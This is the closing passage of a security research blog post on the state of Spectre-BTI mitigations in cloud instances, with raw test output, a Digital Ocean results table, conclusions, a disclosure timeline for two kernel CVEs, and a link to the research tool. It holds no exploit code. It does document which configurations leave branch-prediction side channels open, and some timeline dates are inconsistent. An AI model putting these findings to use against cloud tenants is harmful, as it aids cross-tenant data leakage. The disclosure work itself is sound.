</span></span><span class=line><span class=cl>  * Single Thread Indirect Branch Predictors (STIBP)
</span></span><span class=line><span class=cl>    * SPEC_CTRL MSR is available: NO 
</span></span><span class=line><span class=cl>    * CPU indicates STIBP capability: NO 
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>Testing victim-PRCTL on core 1: 
</span></span><span class=line><span class=cl>PRCTL GET value 0x9
</span></span><span class=line><span class=cl>rdmsr: CPU 1 cannot read reg 72
</span></span><span class=line><span class=cl>Rate: 1000/1000  MSR[72]=-1
</span></span><span class=line><span class=cl>[...]
</span></span><span class=line><span class=cl>Rate: 1000/1000  MSR[72]=-1
</span></span><span class=line><span class=cl>Total misspredict rate: 9998/10000 (99.98 %)
</span></span></code></pre></td></tr></table></div></div><h2 id=tests-on-digital-ocean>Tests on Digital Ocean<a hidden class=anchor aria-hidden=true href=#tests-on-digital-ocean>#</a></h2><p>The tested machines correctly enumerate the CPUs and allow MSR writes. We did observe a higher than expected hit rate with the IBPB usage. It is unexpected since, as we’ve stated in the beginning of the report, some hits were supposed to be seen due to the lack of synchronization, but what we saw was closer to 30% (versus &lt;1%). Given that IBPB does seem to be used, it might be something unrelated to the scope of this research so we’ve decided to report the observation versus investigating it further (notice that we had difficulties identifying the underlying hardware used as well).</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Kernel is Linux 5.19.0-23-generic #24-Ubuntu SMP PREEMPT_DYNAMIC Fri Oct 14 15:39:57 UTC 2022 x86_64
</span></span><span class=line><span class=cl>CPU is DO-Premium-AMD
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Hardware check
</span></span><span class=line><span class=cl>* Hardware support (CPU microcode) for mitigation techniques
</span></span><span class=line><span class=cl>  * Indirect Branch Restricted Speculation (IBRS)
</span></span><span class=line><span class=cl>    * SPEC_CTRL MSR is available:  YES 
</span></span><span class=line><span class=cl>    * CPU indicates IBRS capability: NO 
</span></span><span class=line><span class=cl>    * CPU indicates preferring IBRS always-on: NO 
</span></span><span class=line><span class=cl>    * CPU indicates preferring IBRS over retpoline: NO 
</span></span><span class=line><span class=cl>  * Indirect Branch Prediction Barrier (IBPB)
</span></span><span class=line><span class=cl>    * CPU indicates IBPB capability:  YES (IBPB_SUPPORT feature bit)
</span></span><span class=line><span class=cl>  * Single Thread Indirect Branch Predictors (STIBP)
</span></span><span class=line><span class=cl>    * SPEC_CTRL MSR is available: YES 
</span></span><span class=line><span class=cl>    * CPU indicates STIBP capability: YES (AMD STIBP feature bit)
</span></span><span class=line><span class=cl>    * CPU indicates preferring STIBP always-on: NO 
</span></span></code></pre></td></tr></table></div></div><table><thead><tr><th>Mitigation</th><th>NOSMT</th><th>SMT</th><th>Expected?</th></tr></thead><tbody><tr><td>No mitigation</td><td>0.04 %</td><td>0.41 %</td><td>No</td></tr><tr><td>IBRS</td><td>0.05 %</td><td>0.38 %</td><td>No</td></tr><tr><td>STIBP</td><td>0.14 %</td><td>0.25 %</td><td>No</td></tr><tr><td>IBPB</td><td>29.39 %</td><td>18.88 %</td><td>No</td></tr><tr><td>PRCTL</td><td>0.02 %</td><td>0.02 %</td><td>No</td></tr></tbody></table><h2 id=conclusion>Conclusion<a hidden class=anchor aria-hidden=true href=#conclusion>#</a></h2><p>The hardware mitigations for spectre-BTI provide different options for different scenarios. They also vary in performance impact and scope. Those mitigations are exposed to the applications via a kernel system call that abstracts some of the complexity (such as deciding if there are sibling threads or not on a system, if and which of the hardware mitigations are available and adequate, etc). Besides that, another level of abstraction is the hypervisor (which can expose or not the hardware features by filtering the cpuid output, or even control the MSR accesses and the understanding of sibling threads and cores). Each abstraction (hypervisor, kernel, hardware) has to properly work for the mitigation to be complete. Unfortunately, while the hardware interface is well documented, the kernel interface changes its default (like using IBRS versus STIBP/IBPB) and the hypervisor is dependent on the configuration (which is controlled by the different cloud providers, that DO NOT share their choices). That leads to a scenario in which the default configuration might be adequate for bare metal machines, but it is not (for different reasons) in the different cloud setups.</p><p>Given our research was not comprehensive (many different stances and offers were not tested) and the test method could be greatly improved, as well as some of the observed results could be more deeply analyzed, we are also sharing the raw data in the hopes to incentivize the community (and the security engineering teams of the companies) to look further.</p><h2 id=acknowledgements>Acknowledgements<a hidden class=anchor aria-hidden=true href=#acknowledgements>#</a></h2><p>We would like to thank Alexandra Sandulescu for the excellent feedback, discussions and for reviewing/editing this write-up.</p><h2 id=tool--source-code>Tool & source code<a hidden class=anchor aria-hidden=true href=#tool--source-code>#</a></h2><p>The tool and results for multiple instances can be found at <a href=https://github.com/es0j/hyperbleed>https://github.com/es0j/hyperbleed</a> .</p><h2 id=timeline>Timeline<a hidden class=anchor aria-hidden=true href=#timeline>#</a></h2><ul><li>December 01 2022 - Unexpected behavior on prctl detected</li><li>December 30 2022 - CVE 2023-0045 reported to kernel security team</li><li>January 01 2022 - CVE 2023-0045 fixed</li><li>December 23 2022 - First version of this writeup</li><li>December 26 2022 - Multiple tests performed on cloud providers</li><li>December 28 2022 - KVM behavior better understood, more cloud provider tests</li><li>December 31 2023 - Final write-up shared with AWS, Google, Oracle and Digital Ocean. No response until near the finish of 90 days embargo.</li><li>February 20 2023 - CVE 2023-1998 spectre v2 SMT mitigations problem reported to kernel security team</li><li>March 02 2023 - CVE 2023-0045 disclosed on google security research</li><li>March 30 2023 - CVE 2023-1998 fixed</li><li>April 12 2023 - CVE 2023-1998 disclosed on google security research</li><li>May 29 2023 - Hyperbleed report published</li></ul><h3 id=references>References:<a hidden class=anchor aria-hidden=true href=#references>#</a></h3><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p>“Exec ASLR: Abusing Intel Branch Predictors to bypass ASLR”. Link: <a href=https://github.com/es0j/ExecASLR-ekoparty>https://github.com/es0j/ExecASLR-ekoparty</a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:2><p>“Reverse Branch Target Buffer Poisoning”. Link: <a href=https://cos.ufrj.br/uploadfile/publicacao/3061.pdf>https://cos.ufrj.br/uploadfile/publicacao/3061.pdf</a>&#160;<a href=#fnref:2 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:3><p>&ldquo;RET2ASLR - Leaking ASLR from return instructions&rdquo; Link:<a href=https://github.com/google/security-research/tree/master/pocs/cpus/ret2aslr>https://github.com/google/security-research/tree/master/pocs/cpus/ret2aslr</a>&#160;<a href=#fnref:3 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:4><p>“Branch Target Injection". Link: <a href=https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/advisory-guidance/branch-target-injection.html>https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/advisory-guidance/branch-target-injection.html</a>&#160;<a href=#fnref:4 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:5><p>“The Linux kernel user-space API guide: Speculation Control”. Link: <a href=https://docs.kernel.org/userspace-api/spec_ctrl.html>https://docs.kernel.org/userspace-api/spec_ctrl.html</a>&#160;<a href=#fnref:5 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a>&#160;<a href=#fnref1:5 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:6><p>&ldquo;Linux Source code&rdquo; Link: <a href=https://elixir.bootlin.com/linux/v5.15.65/source/arch/x86/kernel/cpu/bugs.c#L1970>https://elixir.bootlin.com/linux/v5.15.65/source/arch/x86/kernel/cpu/bugs.c#L1970</a>&#160;<a href=#fnref:6 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a>&#160;<a href=#fnref1:6 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:7><p>&ldquo;Intel® 64 and IA-32 Architectures Software Developer’s Manual Volume 4: Model-Specific Registers&rdquo; Link:<a href=https://www.intel.com/content/dam/develop/external/us/en/documents/335592-sdm-vol-4.pdf>https://www.intel.com/content/dam/develop/external/us/en/documents/335592-sdm-vol-4.pdf</a>&#160;<a href=#fnref:7 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:8><p>&ldquo;AMD64 Architecture Programmer’s Manual Volume 2:&rdquo; Link:<a href=https://www.amd.com/system/files/TechDocs/24593.pdf>https://www.amd.com/system/files/TechDocs/24593.pdf</a>&#160;<a href=#fnref:8 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:9><p>“Speculative Execution Side Channel Mitigations”. Link:<a href=https://www.intel.com/content/dam/develop/external/us/en/documents/336996-speculative-execution-side-channel-mitigations.pdf>https://www.intel.com/content/dam/develop/external/us/en/documents/336996-speculative-execution-side-channel-mitigations.pdf</a>&#160;<a href=#fnref:9 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:10><p>&ldquo;Speculative Execution Side Channel Mitigations&rdquo; Link: <a href=https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/technical-documentation/speculative-execution-side-channel-mitigations.html>https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/technical-documentation/speculative-execution-side-channel-mitigations.html</a>&#160;<a href=#fnref:10 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a>&#160;<a href=#fnref1:10 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a>&#160;<a href=#fnref2:10 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:11><p>“The Linux kernel user-space API guide: Speculation Control”. Link:<a href=https://www.kernel.org/doc/html/latest/userspace-api/spec_ctrl.html>https://www.kernel.org/doc/html/latest/userspace-api/spec_ctrl.html</a>&#160;<a href=#fnref:11 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:12><p>&ldquo;Linux Source code&rdquo; Link:<a href=https://elixir.bootlin.com/linux/v5.15.65/source/arch/x86/kernel/cpu/bugs.c#L1900>https://elixir.bootlin.com/linux/v5.15.65/source/arch/x86/kernel/cpu/bugs.c#L1900</a>&#160;<a href=#fnref:12 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:13><p>&ldquo;Seccomp&rdquo; Link:<a href=https://man7.org/linux/man-pages/man2/seccomp.2.html>https://man7.org/linux/man-pages/man2/seccomp.2.html</a>&#160;<a href=#fnref:13 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:14><p>&ldquo;Spectre Meltdown Checker&rdquo; Link:<a href=https://github.com/speed47/spectre-meltdown-checker>https://github.com/speed47/spectre-meltdown-checker</a>&#160;<a href=#fnref:14 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:15><p>“CVE 2023-0045 Bypassing Spectre-BTI User Space Mitigations”. Link:<a href=https://github.com/google/security-research/security/advisories/GHSA-9x5g-vmxf-4qj8>https://github.com/google/security-research/security/advisories/GHSA-9x5g-vmxf-4qj8</a>&#160;<a href=#fnref:15 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:16><p>“CVE 2023-1998 Spectre v2 SMT mitigations problem”. Link:<a href=https://github.com/google/security-research/security/advisories/GHSA-mj4w-6495-6crx>https://github.com/google/security-research/security/advisories/GHSA-mj4w-6495-6crx</a>&#160;<a href=#fnref:16 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></div></div><footer class=post-footer><ul class=post-tags><li><a href=http://localhost:1313/tags/cpu/>Cpu</a></li><li><a href=http://localhost:1313/tags/spectre/>Spectre</a></li><li><a href=http://localhost:1313/tags/cloud/>Cloud</a></li></ul><nav class=paginav><a class=prev href=http://localhost:1313/blog/2023-08-03-patching-games/><span class=title>« Prev</span><br><span>Game Hacking: Using Dynamic Patching to Modify Games</span>
</a><a class=next href=http://localhost:1313/blog/2022-10-02-load+reload/><span class=title>Next »</span><br><span>Load+Reload: Uma prova de conceito de um side-channel que explora a cache associativa de processadores AMD</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share Hyperbleed - Current state of spectre-BTI mitigations on cloud on x" href="https://x.com/intent/tweet/?text=Hyperbleed%20-%20Current%20state%20of%20spectre-BTI%20mitigations%20on%20cloud&amp;url=http%3a%2f%2flocalhost%3a1313%2fblog%2f2023-05-29-hyperbleed-post%2f&amp;hashtags=cpu%2cspectre%2ccloud"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Hyperbleed - Current state of spectre-BTI mitigations on cloud on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3a%2f%2flocalhost%3a1313%2fblog%2f2023-05-29-hyperbleed-post%2f&amp;title=Hyperbleed%20-%20Current%20state%20of%20spectre-BTI%20mitigations%20on%20cloud&amp;summary=Hyperbleed%20-%20Current%20state%20of%20spectre-BTI%20mitigations%20on%20cloud&amp;source=http%3a%2f%2flocalhost%3a1313%2fblog%2f2023-05-29-hyperbleed-post%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Hyperbleed - Current state of spectre-BTI mitigations on cloud on reddit" href="https://reddit.com/submit?url=http%3a%2f%2flocalhost%3a1313%2fblog%2f2023-05-29-hyperbleed-post%2f&title=Hyperbleed%20-%20Current%20state%20of%20spectre-BTI%20mitigations%20on%20cloud"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Hyperbleed - Current state of spectre-BTI mitigations on cloud on facebook" href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fblog%2f2023-05-29-hyperbleed-post%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Hyperbleed - Current state of spectre-BTI mitigations on cloud on whatsapp" href="https://api.whatsapp.com/send?text=Hyperbleed%20-%20Current%20state%20of%20spectre-BTI%20mitigations%20on%20cloud%20-%20http%3a%2f%2flocalhost%3a1313%2fblog%2f2023-05-29-hyperbleed-post%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Hyperbleed - Current state of spectre-BTI mitigations on cloud on telegram" href="https://telegram.me/share/url?text=Hyperbleed%20-%20Current%20state%20of%20spectre-BTI%20mitigations%20on%20cloud&amp;url=http%3a%2f%2flocalhost%3a1313%2fblog%2f2023-05-29-hyperbleed-post%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Hyperbleed - Current state of spectre-BTI mitigations on cloud on ycombinator" href="https://news.ycombinator.com/submitlink?t=Hyperbleed%20-%20Current%20state%20of%20spectre-BTI%20mitigations%20on%20cloud&u=http%3a%2f%2flocalhost%3a1313%2fblog%2f2023-05-29-hyperbleed-post%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentcolor" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=http://localhost:1313/>Blog do GRIS</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>